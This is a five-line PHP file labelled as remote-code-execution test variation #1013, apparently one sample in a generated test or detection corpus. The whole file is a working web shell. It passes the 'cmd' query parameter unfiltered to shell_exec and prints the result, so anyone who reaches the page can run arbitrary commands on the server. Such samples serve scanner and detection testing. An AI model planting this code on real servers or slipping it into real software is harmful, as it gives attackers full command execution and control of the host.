<?php
// RCE test variation #1013
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>